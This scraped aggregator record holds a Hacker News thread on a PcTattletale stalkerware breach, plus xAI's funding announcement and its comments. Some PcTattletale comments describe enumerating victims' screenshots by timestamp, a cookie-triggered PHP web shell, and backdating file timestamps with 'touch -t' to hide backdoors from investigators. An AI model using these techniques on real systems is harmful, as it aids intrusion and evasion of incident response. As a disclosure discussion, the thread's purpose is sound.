PCTattletale's entire database, among other things. While the exploit was unrelated to mine, it was about equally trivial... another shining example of security practices from the stalkerware industry. Timeline 2024-05-12: initial analysis 2024-05-13: proof of concept script written, contacted developers and Zack Whittaker at TechCrunch 2024-05-17: Zack contacts developers 2024-05-22: publication here and in TechCrunch, still no response from developers 2024-05-26: post updates with full writeup",
    "commentLink": "https://news.ycombinator.com/item?id=40486991",
    "commentBody": "PcTattletale leaks victims' screen recordings to entire Internet (ericdaigle.ca)155 points by nneonneo 17 hours agohidepastfavorite60 comments buran77 11 hours agoThe even more worrying thing for anyone considering any solutions which do such mass surveillance, regardless of motive (like Windows Rewind). They're all one or two steps removed from massive scale access to these recordings. All of the steps have happened repeatedly in the past. The only way to be safer is not keep that data in the first place. > the tiny shell lets anyone execute abitrary php code by simply setting a cookie. what makes this file such an interesting find, though, is that the shell has been present since at least december 2011 (which is when the site got moved to its current server). it is impossible to tell whether this shell was placed there by pcTattletale (for whatever reason) or by a threat actor; either way, it reveals that pcTattletale has been backdoored for basically forever and may have had data exfiltrated from it for years by external actors reply Renaud 4 hours agoparentIsn't MS Rewind/Recall supposed to be encrypted and offline, on-device only? I don't see how it could be anything else and pass any data-protection regulation (in the EU, at least). It's a hazard and its usefulness needs to be balanced with other needs, but on a work machine that belongs to me, it could be useful. Now, if my boss has unfettered access to this data, or any of it is online, then obviously it's a no no. Understanding the implications of tools like this is necessary. I'm not too optimistic that the general user will fully understand these implications though. That's one of the main danger with these technologies: promises are made, people don't think twice and overshare, and the data is used against their interests. However, I want it to exist, MS or Open Source, preferrably, but only if I get 100% control over it, and it is never accessible to anyone else. Having said that, I'm very much aware that most implementation of these tools will become a security and surveillance nightmare. The next few years are going to be interesting, and probably frightening. reply loeg 2 hours agorootparentIf the data can be accessed by the user, it can be accessed programmatically -- no? It's available locally for something malicious to exfiltrate. reply Dylan16807 1 hour agorootparentSo Rewind expands the \"locally malicious software\" scenario from \"it accesses all my files and it can monitor me going forward\" to \"it accesses all my files and it can monitor me retroactively for a few months and also going forward\"? That's a little bit worse but not much worse. reply mrangle 2 hours agorootparentprev>I don't see how it could be anything else and pass any data-protection regulation >Having said that, I'm very much aware that most implementation of these tools will become a security and surveillance nightmare. The contradiction of the quoted statements nullifies anyone's ability to make sense of the theme in the post. reply sandworm101 3 hours agorootparentprev>> Isn't MS Rewind/Recall supposed to be encrypted and offline, on-device only? From what I have been reading, the raw data is meant to remain local (the screen recordings) but I am unclear about the indexed AI-generated metadata. For instance, if the AI identified that you used X software at Y time to complete Z task, are the XYZ tags kept local or archived elsewhere? That might not violate many privacy rules. Either way, they certainly could be uploaded/shared very easily should Microsoft's policies change. I guess it is down to how much we all trust Microsoft long term. Personally, I will never accept someone recording my screens. In fact, running any such software on my work machine would violate a host of professional rules. reply jkaplowitz 26 minutes agorootparentI can’t imagine them not providing a way to turn Recall off, for reasons like the ones you describe. reply dgellow 11 hours agoparentprevWindows Recall is stored locally and encrypted from what I understood reply bayindirh 7 hours agorootparentIts keys or the token which gets the key from the TPM will probably be memory resident. I don't see encryption as a barrier to get relevant information. In the future, if I know Microsoft, this trove will be mined for \"consumer oriented optimization and improvement of Windows Experience\". This means at least a DLL or more probably an API will be present to tap into that data, which can be (ab)used by third parties. So, even if it's stored locally and be encrypted at rest, it doesn't mean it'll be completely unavailable to Microsoft or third parties. Oh, lastly, I'm sure that there'll be at least one forensics company which will build a tool to dump this data, making governments do a little happy dance. reply dgellow 2 hours agorootparentWe will see. I still have some hopes, call me foolish or naive, that Microsoft will implement Recall in way that would be compliant with EU GDPR. The user is in control and can decide how data are being accessed. So far that’s what I’ve seen, users can control applications, website that are saved, and for how long. They can also easily delete a timeframe of data. But if I’m honest I would never use that feature if I would leave outside of the EU, I don’t know another regulatory body big tech is taking seriously. reply buran77 10 hours agorootparentprevUntil a year or two later when MS rolls out the feature of \"AI\" on \"your data\". Or gives the option/default to store the recording on OneDrive. Or any number of options that MS can monetize somehow while selling it as a benefit for you. How many massively popular feature requests sit on the waiting list every day while this one comes out of the blue despite almost no user ever asking for it, and it's for you? Rewind is the house's foundation, the rest of the walls come later. How fast they come depends on what the CEO sees as the future of making money. Having these recordings is a liability more than it is a productivity boost. People today don't operate computers under the assumption they are recorded at all times even if they know the feature is there. So of course it's dangerous. One day, when you'll be thoroughly used to being surveilled at all times, having Rewind-like features will be as ubiquitous or as normal as walking around today with a GPS tracker, microphone and spy cam in your pocket, for someone else to use. Something equally unacceptable some decades ago. reply WhackyIdeas 7 hours agorootparentThe only good thing about Recall is that it has been the definitive decider of moving away from Microsoft permanently because for them to create such a ‘feature’ shows a complete lack of care about people’s private data - they’ll be leaving a huge jackpot prize for anyone who breaks into a system. Just the kind of thing this NSA Prism-participating company would think was a top notch idea. Not saying the real motive is surveillance… I’m sure a feature update or two away will also turn the data into a real money maker of advertising which instead of just being able to advertise to you, can kill two birds with one stone in being able to increase tenfold the ad revenue by watching who you’re talking with in your emails, your PM’s on Facebook (or wherever else) and then selling marketing data on you AND them. If I was a purely profit driven individual - I’d be doing exactly that. But I have too much of a heart. Even if they say that they’ll be abandoning this idea as they have ‘listened to user feedback’ or some other bull, the complete damage has already been done here. Thank the lord there are an abundance of excellent OS alternatives. reply mistrial9 2 hours agorootparentno - the employer makes their subjects do it. It has always been that way, now it is more obvious, again. reply wkat4242 10 hours agorootparentprev> Until a year or two later when MS rolls out the feature of \"AI\" on \"your data\" It's already touted as an AI feature. And yes Microsoft is very adamant the images are stored locally, I wonder if all the processing is purely local too though. reply buran77 9 hours agorootparent> Microsoft is very adamant the images are stored locally But this is today (as in \"at the literal moment the statement was made\"). What about tomorrow? History is plastered with examples of things companies were adamant about and as it turned out they either didn't keep their word for long or even it was a lie as it was spoken. One day they'll decide it's for your own interest to share this data. Or a patch will accidentally sync it to the cloud. Or their model will be trained on your data. Or authorities start targeting this for obtaining way more data than otherwise needed. Or malware will use it as a treasure trove of info like never before. All of this keeps happening, I can't bring myself to believe this case in particular will break the mold. reply wkat4242 7 hours agorootparentYes I don't trust them either. At all. I didn't say that too explicitly, sorry. reply rgmerk 9 hours agorootparentprevDoesn't matter as a tool of domestic abuse, as the attacker almost certainly has local access to the device concerned. The howls of outrage when Microsoft announced this are such that they may well have gotten the message on this one. But somebody else lower-profile will have the same bright idea. reply wkat4242 4 hours agorootparentTrue, an attacker can install a screen capture tool but they will not automatically have the access to data from months back of course. reply dgellow 9 hours agorootparentprev> despite almost no user ever asking for it Honestly I never asked for it but now that I’ve seen it I want to try on my personal machines, if data are local I have no issues with it at all. I’m personally not afraid of Microsoft, but I understand they haven’t been good at building trust for the past decade+. It would be awesome as an open source project. However I can see how something like Recall is pretty problematic in a corporate context, when enabled by admins without end-user controls reply a0123 7 hours agorootparentThe tech demos never work as demonstrated at the tech demo conference. reply sandworm101 5 hours agorootparentprev>> One day, when you'll be thoroughly used to being surveilled at all times When that day comes, when you don't want someone recording your screen and rummaging around your hard drives, linux will be there. Every bad day for Windows is a good day for linux. reply squigz 10 hours agorootparentprevUntil Microsoft wants to start using that data, or is compelled to hand it over. reply a0123 7 hours agorootparentprevThat's fine then because no one has ever managed to get around a single security measure, especially not in the world of computing. reply jocoda 7 hours agorootparentprevI'm all for tools like this if they allow me to review my activity, especially if that's across the multiple systems I use, to get a handle on how and where I spend my time. It's not a surprise that Microsoft and Apple are determined to get us to use their cloud products for our personal data - there's billions up for grab. reply dorkwood 10 hours agorootparentprevYes. I've heard it's unhackable. We are in good hands. reply WhackyIdeas 7 hours agorootparentFor anyone downvoting this person, keep in mind they are quite obviously being sarcastic…… reply TiredOfLife 4 hours agoparentprevAlso newer ever make any notes or take any photos/video of anything. Talk only face to face in a cone of silence. reply buran77 3 hours agorootparentThe sarcasm made an already shaky point even worse. There's a huge difference in magnitude here (writing a note vs. screen grabbing everything you ever do on the computer), and also a difference of awareness (intently recording one moment in time with a photo vs. almost unconsciously being recorded all the time even if you enabled it). These simplistic fallacies are the result of very superficial assessments. Either an apparently small mistake leads to a wildly wrong conclusion (being overheard once is the same as being overheard all the time, because overheard is overheard), or everything is justifiable in small increments so you just loop through them as many times as it takes to get to a wildly unacceptable result (if one photo is ok, then two photos are ok, and just iterate it until you get 30 photos per second of constant video surveillance, you just said you're fine with one more photo). Bottom line being you won't get anything of value out of such a conversation. I know I don't. reply VS1999 3 hours agorootparentprevThis dismissive, snarky one-liner only works if people already overwhelmingly agree with you. Most people are tired of companies adding more and more surveillance \"features\" and grew up in a time that set a higher bar for how much privacy they're willing to give away. A user taking a note? Sure. The OS recording everything you do 24/7 to send through an AI? Maybe we need new legislation to address your behavior. reply supernes 12 hours agoprevWhat a wild story. From one of the linked reports: > it took Fleming over 20 hours to take the defaced website offline, but the long time was not for lack of trying: his own spyware recorded him clumsily attempting to restore the site fairly early on but ultimately failing to do so. while pcTattletale itself has now been entirely down for a few hours, the sending of screenshots to the s3 bucket continued until Flemings aws account was locked down by amazon shortly before publishing this article. reply userbinator 5 hours agoprevUnfortunately there are 86400 timestamps per day, so enumerating this across all days and all devices would take forever. Instead we'll use a heuristic: we'll start with the last screenshot and subtract one second at a time, downloading from each and seeing if we get a valid photo or the error XML that comes up if no screenshot was taken at that second. If we get the error XML 20 times in a row, we'll assume the recording is over and give up. Binary search? reply e_daigle 11 hours agoprevI'm the author of the blog post - the exploit is so simple it kind of speaks for itself, but if anyone has any questions feel free. reply mmsc 6 hours agoprevwhat makes this file such an interesting find, though, is that the shell has been present since at least december 2011 It's really easy to change the creation date of a file by changing the system clock for a millisecond, and create a file, before changing the clock back to normal. Some people like to do this to avoid their back doors being found by IR doing a \"find\" for any newly created files. reply zaxomi 6 hours agoparentNo need to change the system clock for a millisecond. The operating system has an API for changing allt the timestamps of a file. reply vitus 6 hours agorootparentIndeed, that's what `touch -t 201101020304 /tmp/old-file` is for. (Although on ext4 it seems that you can't control the birth time; for that you would need to set your system clock.) reply gigatexal 5 hours agoprevJust in time for Microsoft Rewind or whatever it’s called. reply justin_oaks 3 hours agoprev> the pcTattletale client api returns raw aws credentials. it's intended to allow screenshots to be directly uploaded to the storage bucket, which is already terrible enough on its own, but it's worsened by the fact that these credentials are the same for all devices and provide full unscoped access to Fleming's aws infrastructure (From the Maia arson crimew blog post linked in the article) This is my favorite part of the story. This is one of the worst decisions you can make when developing an app that uses cloud resources. It's so pathetic that it makes me wish that we could revoke someone's license to write code. reply rinze 12 hours agoprevIs that the codename for Windows 11? reply ronsor 12 hours agoparentBased on the functionality, I'd think it's the codename for \"Copilot Plus\" or whatever it's called now. reply urbandw311er 11 hours agoprevSo 17Tb of screenshot data from the last 7 years is doing the rounds in the wild? An AI will have a field day extracting whatever kinds of specific juicy details an attacker could ever want. “Give me a list of all the credit card numbers” “Give me any emails where somebody is asking a lawyer to block publication of something” Etc reply squigz 10 hours agoparentI don't think the AI's day is going to be any different, really. reply junniper 13 hours agoprevYeesh. Is it still considered a “vulnerability” if the door is built without locks? Or even a handle. reply ronsor 12 hours agoparent\"What door?\" reply junniper 5 hours agorootparentDoors with locks are often a metaphor for security. In this case the “door” is this company’s API. Considering the context of the original post what did you think my comment meant? reply BobaFloutist 3 hours agorootparentTheir joke was that the security is so poor, it could even be conceived as a doorway they never put a door in. They were playing off your comment and agreeing by exaggerating further. reply junniper 3 hours agorootparentYou’re right! Now I feel silly for missing the joke. reply rgmerk 9 hours agoprevThis kind of thing has happened repeatedly, but kinda misses the point. Stalkerware is designed and built as a tool of abuse. The people who create it are looking to profit off that abuse. More effort should be devoted to prosecuting these bottom-feeders. reply TiredOfLife 4 hours agoparentUS and other countries are moving to classify more and more things as \"not a crime\" like car theft or shoplifting. So don't hold your hope up. reply ziddoap 3 hours agorootparentCan you back this up somehow? I haven't heard of or seen anything indicating that the US, or any other country, is trying to make car theft or petty theft legal. reply mk67 3 hours agorootparentFrom what I read it's not prosecuted in San Francisco e.g. anymore. reply halfcat 3 hours agorootparentprevThey’re probably referring to situations in California where people walk out with merchandise because the penalties are less than the merch they’re getting. It’s less of a “the way things are headed” in the US, and more of a side effect of the state-level political games each side is playing, where blue states score points by loosening penalties, and red states score points by tightening penalties. Neither population of state citizens is right or wrong, but rather they’re all pawns. As someone put it, the politicians have organized the country into two LARPing teams to keep everyone distracted while they run out the back door with the money. reply imchillyb 1 hour agoprevMy Grandfather: \"Don't write anything down that you don't want others to see.\" Those words have been with me since I was 8 years old. The truth of them resounds throughout history, and well into the distant future. Ignore them at your peril. reply badgersnake 9 hours agoprevAll the users password hashes (in MD5, so basically their plaintext passwords) got leaked as well. reply abtinf 4 hours agoprevThis, and the other stalkerware linked to in the article, is what everyone on iOS can look forward to thanks to the EU. reply wackget 4 hours agoparentYou mean the ability to install your choice of software on a device that you own is dangerous????? Someone should tell the authors of literally every other operating system ever made about this astonishing discovery! reply abtinf 3 hours agorootparentThey should. Every major platform has this issue pervasively, except for iOS. People like you have decided that you own my phone, not me. You get to tell me and Apple how I have to use my phone, just because you don’t like that my choice of software is a locked down device. reply VS1999 2 hours agorootparentYou don't have to use your phone any way. Just don't download something if you don't want it, silly. reply EMIRELADERO 4 hours agoparentprevCare to elaborate? I thought Chat Control laws and similar were deemed \"unconstitutional\" by the ECHR reply abtinf 4 hours agorootparentSideloading. reply halfcat 3 hours agoprev [–] It appears that this is installed to the path below on Windows, if you want to check if it’s running on your PC: C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\scheduler Using one of these executable names: mssched.exe jusched32.exe reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "On May 22, 2024, a critical vulnerability in the stalkerware app PCTattletale was exposed, allowing attackers to access screen recordings from infected devices.",
      "Despite warnings, the company did not respond, prompting Amazon to lock the app's AWS infrastructure; users are advised to run antivirus scans and seek help from the Coalition Against Stalkerware.",
      "The vulnerability, discovered by Jo Coscia, involved an Insecure Direct Object Reference (IDOR) and poor security practices, leading to unauthorized access and a major data breach."
    ],
    "commentSummary": [
      "PcTattletale, a surveillance tool, has been leaking victims' screen recordings online due to a backdoor allowing arbitrary PHP code execution via a simple cookie since December 2011.",
      "A critical security flaw in the pcTattletale client API exposes raw AWS credentials, granting unrestricted access to cloud resources and raising concerns about the misuse of 17TB of leaked screenshot data.",
      "The incident highlights significant security concerns about surveillance tools and underscores the need for stringent data protection, user control, and potential new legislation to prevent misuse and privacy breaches."
    ],
    "points": 155,
    "commentCount": 60,
    "retryCount": 0,
    "time": 1716775238
  },
  {
    "id": 40487844,
    "title": "xAI Secures $6B Series B Funding to Accelerate AI Development and Market Expansion",
    "originLink": "https://x.ai/blog/series-b",
    "originBody": "xAI is pleased to announce... Our Series B funding round of $6 billion with participation from key investors including Valor Equity Partners, Vy Capital, Andreessen Horowitz, Sequoia Capital, Fidelity Management & Research Company, Prince Alwaleed Bin Talal and Kingdom Holding, amongst others. xAI has made significant strides over the past year. From the announcement of the company in July 2023, to the release of Grok-1 on X in November, to the recent announcements of the improved Grok-1.5 model with long context capability, to Grok-1.5V with image understanding, xAI’s model capabilities have improved rapidly. With the open-source release of Grok-1, xAI has opened doors for advancements in various applications, optimizations, and extensions of the model. xAI will continue on this steep trajectory of progress over the coming months, with multiple exciting technology updates and products soon to be announced. The funds from the round will be used to take xAI’s first products to market, build advanced infrastructure, and accelerate the research and development of future technologies. xAI is primarily focused on the development of advanced AI systems that are truthful, competent, and maximally beneficial for all of humanity. The company’s mission is to understand the true nature of the universe. xAI is hiring for numerous roles and seeks talented individuals ready to join a small team focused on making a meaningful impact on the future of humanity. Those interested can apply today at x.ai/careers.",
    "commentLink": "https://news.ycombinator.com/item?id=40487844",
    "commentBody": "xAI announces series B funding round of $6B (x.ai)152 points by frisco 13 hours agohidepastfavorite232 comments lionkor 13 hours ago> The company’s mission is to understand the true nature of the universe. I yawned so hard my jaw unlocked. Can't wait to see groundbreaking... checks notes... \"advancements in various applications, optimizations, and extensions of the model\". Do these companies only hire yes men? reply antman 10 hours agoparentSeems like the Nigerian Prince bayesian model as analysed by Microsoft. Due to many false positives within the thousands of potential responders pool, they emit a signal that only a real easy victim would fall for to reduce the costs of their final filtering process. https://www.microsoft.com/en-us/research/wp-content/uploads/... reply 3abiton 10 hours agorootparentIt was a very enjoyable read for a scientific publication. reply gizajob 12 hours agoparentprev“The company’s mission is to understand the true nature of the universe” - There’s no way an LLM is going to get anywhere near understanding this. The true nature of the universe is unlikely to be captured in language. reply nomel 11 hours agorootparentConsidering what’s at Tesla, I don’t think it makes sense to assume they’ll be constraining themselves to text/LLM. But on the philosophical side, if an understanding can’t be communicated, does it exist? We humans only have various movements and vibrations of flesh, sensing those, text, and images to communicate. reply SuchAnonMuchWow 11 hours agorootparent> But on the philosophical side, if an understanding can’t be communicated, does it exist? There are deep mathematical results about our limits to understand things simply because we communicate through finite series of symbols from finite dictionaries. Basically what we can express and prove is infinite but discrete, but there is much larger infinities than that that will be beyond our grasps forever. Things like theorems that are true but can not be proven to be true, or properties on individuals real numbers that exist but can not be expressed. And there is no reason to believe the universe doesn't have the same kind of thing: it remains to be shown whether or not you can describe or understand the universe with a finite set of symbols. reply talldayo 2 hours agorootparentYep. Expanding on that; before AI everyone I knew would postulate on the fictional Library of Babel. The idea was a thought experiment, where you assume there exists a library with every possible combination of words and letters written down in one of it's books. There would be millions of issues that are filled with garbled and meaningless text; only a few would be legible, and fewer yet understandable. It begs the question, if sifting through noise is a meaningful way to look for scientific progress. And of course, what if it's wrong? Both the Library of Babel and AI are fully capable of leading us down untested and nonsense rabbit-holes. The difference between Alice and Wonderland and Jabberwocky is unknown to us; we wouldn't know which books are worth reading and which are not. On the one hand, you have people excited by this idea. Some people really do think that the world's answers are up on a bookshelf in the Library of Babel, somewhere. The philosophical angle runs deeper yet, though; what kind of cargo-cult society would we build relying on a useful AI? Are we guaranteed meaningful progress because an AI model can keep pressing the \"randomize\" button? Do we eventually hit a point where fiction and reality are indistinguishable? It's all hard to say. reply ben_w 1 hour agorootparentPeter Principal but with AI: it will keep being used for increasingly demanding talks, until being promoted one step beyond its competence. reply snowpid 9 hours agorootparentprev\" Considering what’s at Tesla, I don’t think it makes sense to assume they’ll be constraining themselves to text/LLM. \" Tesla is losing money and cant fulfill its promises about AI. What do you mean? reply ben_w 1 hour agorootparentThe cars may not fulfill the promise, but the self driving cars sure aren't being driven around by a large language model. reply snowpid 6 hours agorootparentprevFirst statement is wrong. Just sales dropped, Tesla is earning money though. Tesla though has a strong story of broken promises on Automated Driving. reply andsoitis 4 hours agorootparent> Tesla though has a strong story of broken promises on Automated Driving. While that is true, it is also noteworthy that Jensen Huang thinks Tesla is far ahead in self-driving cars. https://autos.yahoo.com/nvidia-ceo-says-tesla-far-110000305.... reply cma 4 hours agorootparentDoubt he's going to talk bad about an Elon company while inking the 100,000 GPU deal for this xAI cluster. reply uargos 12 hours agorootparentprevVery little people seem to understand that. And actually there is no need to go as far as “universe” to get to something that can’t be captured by language. Human existence is such an example. For this reason I don’t think llms are going to be good film makers for instance. Sure an llm will be able to spit the scenario of the next action movie, those already seem to be automatically generated anyway. But making a film that resonates to humans takes a lot that can’t be formulated with language. reply ben_w 3 hours agorootparent> And actually there is no need to go as far as “universe” to get to something that can’t be captured by language. Human existence is such an example. I don't know what you mean by that. If you mean qualia, then sure. Unsolved and undescribed. But other than that, I think everything has a linguistic form; perhaps inefficient, but it is possible. Separately, transformers don't have to use what humans recognise as a langue, this means they can use things such as DNA sequences and pictures. They're definitely not the final answer to how to do AI, because they need so many more examples than us, but I don't have confidence that they can't do these things, only that they won't. reply aydyn 12 hours agorootparentprevThat's what people said about AI art, yet here we are. reply Kina 11 hours agorootparentIs where we are any good? I think one of the more germane issues with generative AI art is that it is distinctly not creative. It can only regurgitate variations of what it has seen. This is both extremely powerful and limiting. An LLM is never going to give you some of the most famous films like \"Star Wars\" which bounced around before 20th Century Fox finally took a chance on it because they thought Lucas had talent. Is what we want? A society that just uses machines to produce variations of the same thing that already exist all the time? It's hard enough for novel creative projects to succeed. reply aydyn 12 minutes agorootparent> Is where we are any good? I think one of the more germane issues with generative AI art is that it is distinctly not creative. It can only regurgitate variations of what it has seen. Yes, state of the art models like midjourney, sd3 are _really_ good. You are bounded only by your imagination. The idea that generative AI is only derivative was never an empirical claim, its always been a cope. reply cma 4 hours agorootparentprevhttps://en.wikipedia.org/wiki/The_Hidden_Fortress reply ben_w 2 hours agorootparentAnd on the same theme, but a totally different example in a different media: https://youtu.be/5pidokakU4I reply ZiiS 11 hours agorootparentprevIs the current studio system? reply Arnt 10 hours agorootparentprevYes... I'm not sure what the archetype of intelligence is, but for practical purposes I'd say: Humans have some of it. And it's not clear to me that what humans have is very far from what AI is starting to have. The hallucinations are weird and wonderful, but so are some of the answers I saw from below-average students when I was in university. Can't tell whether the two weirdnesses are different or similar. Exciting times lie ahead. reply Jensson 5 hours agorootparent> Can't tell whether the two weirdnesses are different or similar Because you focus on how they are similar and not how they are different, to me it is extremely obvious they are very different. Students make mistakes and learn and then stop doing them soon after, when I taught students at college I saw that over and over. LLM however still does the same weird mistakes they did 4 years ago, they just hide it a bit better today, the core different in how they act compared to humans is still the same as in GPT-2 to me, because they are still completely unable to learn or understand their mistakes like almost every human can. Without being able to understand your own mistakes you can never reach human intelligence, and I think that is a core limitation of current LLM architecture. Edit: Note that many/most jobs doesn't require full human general intelligence. We used to have human calculators etc, same will happen in the future, but we will continue to use humans as long as we don't have generally intelligent computers that can understand their mistakes. reply ben_w 1 hour agorootparent> because they are still completely unable to learn or understand their mistakes like almost every human can So far as I know, all current AI need far more examples than we do. But, that's not why LLMs are \"unable\" to learn: the part which does that is simply not included in when it's deployed for inference. reply jazzyjackson 11 hours agorootparentprevai doesn't make art tho, it paints whatever it's told to reply ben_w 1 hour agorootparentSo do human artists, if they want to get paid. And then you have the discussion about auteurs. reply actionfromafar 11 hours agorootparentprevWhere is that? reply dorkwood 10 hours agorootparentprevIsn't it possible someone already wrote about it somewhere, and none of us realized? reply TMWNN 9 hours agorootparentprev>“The company’s mission is to understand the true nature of the universe” - There’s no way an LLM is going to get anywhere near understanding this. The true nature of the universe is unlikely to be captured in language. I disagree. The day is coming when some *BIG* problem is solved by AI just because someone jokingly asks about it. reply ben_w 1 hour agorootparentIndeed. I regularly try to ask them to give me fluid dynamics simulation code to see what level they are at. Right now, they can't do that kind of thing all by themselves, and I don't know enough to debug the code they give me. But even without any questions about free will or consciousness or whatever, a sufficiently capable — not yet existing — transformative search engine (as it has been derided as) and a logical inference engine (which it isn't, but it can use) could have produced the Aclubiere metric with nothing newer than the Einstein field equations and someone asking the right question. I do not expect transformer models to be good enough to do that given their training requirements, but I wouldn't rule it out either. reply andsoitis 5 hours agorootparentprev42 reply benterix 11 hours agoparentprevThese people always exist. They pick up whatever is en vogue and sell it to investors. What happens later is of secondary importance, what matters is that money changed hands. reply Intralexical 12 hours agoparentprevHopefully incompetence can save us from the megalomania. reply andy_ppp 11 hours agorootparentThe combination of incompetence and megalomania is probably more likely unfortunately. reply b3lvedere 12 hours agoparentprevIt kinda reminds me of James Bond Diamonds are Forever where the main scientist is convinced Blofeld is doing the right thing until the very bitter end. reply danieleggert 13 hours agoparentprevYes reply upon_drumhead 12 hours agorootparentYou're hired reply mgh2 11 hours agoparentprevThe technology's applications are so broad that its exploratory nature in the mission is expected reply darth_avocado 12 hours agoparentprevYes reply rullopat 12 hours agorootparentYou’re hired too reply belter 12 hours agorootparentYour technical interview is way too easy.... reply DoctorDabadedoo 11 hours agorootparentIndeed, please write an algorithm to reverse a linked list in O(1). reply vidarh 11 hours agorootparentAssuming I can choose linked list implementation, that is trivial: It's a doubly linked list where the head contains a pointer to the tail, and a flag that determines which pointer in the nodes is forward and which is backward. reply belter 10 hours agorootparentIt's a trick question. Ask if its on Space or Time complexity ;-) reply melodyogonna 12 hours agoparentprevEverybody wants Elon Musk to make them some money. reply dgellow 11 hours agorootparentIsn’t he known to not pay well his employees? reply melodyogonna 7 hours agorootparentIsn't there an industry standard pay-range? If he isn't paying as well as his competition then I would expect employees to seek better opportunities. reply pfannkuchen 3 hours agorootparentI think SpaceX and Tesla do actually have a reputation for low pay compared to other major tech companies. I think it might be similar to game companies where people are attracted to the work itself (whether it’s because they’re True Believers in Musk or because electric cars and space are cool, not sure, probably mostly the latter). This lets the company pay less for the same level of talent, since the work is in itself a form of compensation (as perceived by the people who accept the jobs for lower pay). reply rchaud 5 hours agorootparentprevThis is a pretty blithe comment that assumes perfect labour mobility. Many of Twitter's remaining employees are on work visas that are tied to Twitter and can't easily be ported to another employer. reply sangnoir 10 hours agorootparentprevHis hype-machine has made some of those who invest on his hype very rich, including through worthless instruments such as meme stocks he was pumping. reply ETH_start 12 hours agoparentprevThis is a peculiar company mission so not sure why you find it odd to make the official one of xAI. The all-encompassing nature of it seems befitting a company producing increasingly general-purpose AI. reply stonogo 12 hours agorootparentSure it does. The problem is that they're not producing any general-purpose AI. reply ETH_start 12 hours agorootparentWhether you agree that their work constitutes advances toward more general purpose AI, they're in an industry where that is ostensibly the goal, which makes their choice of mission statement appropriate. reply nomel 11 hours agorootparentprevX.ai was founded March 2023. That’s one year three months. Is general AI a good first goal? I think most uses, outside of LLM, will be very specialized AI, and unrelated to chat. reply naveen99 6 hours agoparentprevTo play devil’s advocate, he lists “truthful” as a goal, which is emphatically missing from openai, google, microsoft, facebook. Google even removed don’t be evil. Elon is greedy and truthful (although obviously with plenty of self deceipt when conflict of interest…). But how far can you really go with truth, when no one wants the truth: not the west, not the east, and not the Middle East. And your allies and investors are in it for the greed part, but not the truth part so much. Trump tried the same thing with truth social… problem is all the greed and shadiness loses credibility with truth also. reply knowriju 4 hours agorootparentThere is a simple turing test for Elon's AI 1. What happened in Tiananmen Square? 2. Who killed Jamal Khashoggi ? The output will very simply tell how much 'truthful' the AI actually is. reply darksaints 5 hours agorootparentprevThere is nothing truthful that comes out of Elon’s or Trump’s mouth. reply ben_w 57 minutes agorootparentOne has sent his car to a trans-Martian orbit, the other was unable to admit which inauguration had the most people present or how large his apartment is. Don't get me wrong: Musk has and will continue to get into serious trouble for things he insists are true but nobody else believes (420 etc.), I'm just saying there's a huge gap between them. reply leobg 11 hours agoparentprevMy take is that Elon’s basically saying: We don’t give a s%#* about people wanting to use AI to write SEO spam, automate their customer support or generate content to keep the kids quiet. We want to use this tech as a tool to solve real world problems in a way that, looking back 500 years from now, people will see this as a time of innovation, rather than a time of decline. Wether he’ll succeed is a different question, of course. But such a direction is clearly missing in the other players. They are just too eager to cater to the laziest segment of the economy of bits. They’re about changing pixels on other people’s screen. reply gehwartzen 11 hours agorootparentThis is probably the response Elon is looking for when he simply writes something vague that can elicit the imagination of any applicant’s specific worldview. reply jack_pp 11 hours agorootparentprevDeepmind ,which was probably the top dog in cutting edge AI before openAI, was solving protein folding reply actionfromafar 11 hours agorootparentprevAlso, all previous engineering efforts were about changing scrawley symbols on pieces of paper. /s reply aredox 4 hours agoprev6 billion dollars less for really innovative ventures. 6 billion dollars less for us hackers. And certainly 6 billion dollars down the drain, funneled to stave the collapse of X/Twitter and Musk paying his dues. reply klunger 11 hours agoprev> xAI will continue on this steep trajectory of progress over the coming months, with multiple exciting technology updates and products soon to be announced. There is a lot of potential for using AI in drug discovery and development, biotech more broadly and chemistry/material science. Pharma is investing heavily in this right now. If useful, the output here could potentially also support Neuralink and even SpaceX. Coupled with the line about the \"true nature of the universe\", I guessed this was really about entering that space. But when you look at the careers page [https://x.ai/careers#open-roles], they are only hiring AI engineers. No biochemists or MDs, material scientists or any other natural science domains. So, if natural science discovery is actually on the road map, either: - it is in the long term future - they have no idea what they are doing More likely, they are not going for natural science and this is basically just a play to compete with openAI. And, in that case, I don't understand how they convinced investors to put 6 billion dollars into it. reply dagmx 11 hours agoparentThe “true nature of the universe” bit is that Elon believes that competing LLMs are too neutered because they disallow certain terms etc. (his words are much more politically charged and I do not agree with his take on this and many other things) Therefore he believes that Grok can be an LLM trained on the voices of the people using his alleged free speech platform:X. reply smileybarry 6 hours agorootparentFor context, it should be noted that his platform disallows certain terms too, but sometimes worse (in a way). For example: saying “cis” or “cisgender” flags your post as abusive and limits visibility. Saying the 6-letter (or 3-letter) f-slur does not. reply darksaints 5 hours agorootparentprevElon’s vision of free speech is a world where you can say anything you want as long as it isn’t mean towards Elon or Alt-right ideology. Which is actually pretty hilarious to think about in the context of a training dataset for a generative model…it’s literally gonna be a bullshit generator. reply travoc 4 hours agorootparentAre you not able to find mean things about Elon or alt-right people on Twitter? How hard did you look? reply sangnoir 10 hours agorootparentprevIs the assumption here is that we can somehow understand the nature of the universe if we stop censoring the common man and have an unmuzzled LLM that talks like him instead of the Bay Area AI elites? My uneducated guess is well learn more about the true nature of the common clay^w man. reply ml-anon 9 hours agoparentprevSzegedy and some others were working on science-related (math and natural science) projects at Google prior to leaving. This is probably just piggy backing on their prior work without any commitment going forward. Of course they're not going to make any fundamental contributions to natural science or mathematics (or likely even LLM training/understanding). reply croes 11 hours agoparentprevBecause OpenAI is the poster child and that kind of AI is already shoved in all kinds of products by Microsoft. AIs like AlphaFold are hardly in the news compared to OpenAI and its competitors. reply keyle 12 hours agoprevWhat could have they possibly shown to the investors to get that kind of cash thrown at them? Asking for a friend... Did x.ai just become worth more than x.com? We must be nearing the bubble popping... reply dubeye 8 hours agoparentMaybe they showed them the founders ROI record? reply breck 9 hours agoparentprev> What could have they possibly shown to the investors to get that kind of cash thrown at them? Their founder has a track record of making his investors a lot of money while solving really hard, important problems. Current valuations: - Tesla $570B - SpaceX $180B - Neuralink $5B - Boring $5.6B reply tarsinge 6 hours agorootparentThe capacity of continuing the real world problem solving is very blurry. Boring is a joke. For Tesla he is not a founder, and they are mostly relying on a 10 year old product (new product is a joke) that'll only maybe saved with tariffs. It's mostly a meme stock company 